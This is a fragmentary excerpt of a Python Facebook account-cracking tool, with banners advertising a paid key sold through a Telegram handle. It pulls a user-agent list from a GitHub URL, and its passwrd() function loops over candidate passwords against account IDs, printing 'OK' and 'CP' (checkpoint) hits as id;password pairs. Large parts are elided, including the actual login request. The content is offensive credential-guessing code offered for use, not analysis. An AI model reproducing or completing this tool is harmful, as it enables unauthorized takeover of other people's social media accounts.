...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/ViratUp/active/main/id%20active%20krdn').text
		ua=open('.bbnew.txt','w')
...
|‌●‌|‌=‌|‌●‌| ɴᴏᴛᴇ 5$ ғᴏʀ ᴋᴇʏ ᴛᴇʟᴇɢʀᴀᴍ @MPMPK  |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌| 웃 ZAENABUP 웃  |‌●‌|‌=‌|‌●‌|      ╰╮✾╭╯✯ ᴛᴏᴏʟ FB✯╰╮✾╭╯
...
def passwrd():
	...
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐂𝐑𝐀𝐂𝐊 𝐆𝐎𝐎𝐃 𝐖𝐀𝐈𝐓 \033[0;1m( \033[32m𝐋𝐔𝐅𝐅𝐘𝐎-𝐌𝐀𝐋𝐀-𝐏𝐀𝐑𝐈𝐒 \033[0;1m)')
	...
	for pw in pwv: 
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[0;1FB \033[33;1mʟᴜғғʏ𝝾_ꪑꪖꪶꪖ CP: {idf};{pw}')
				cp+=1
				break
				...
				print('\n')
				print(f'\033[0;1mFB \033[32;1mʟᴜғғʏ𝝾_ꪑꪖꪶꪖ OK: {idf};{pw}')
				ok+= 1
				break
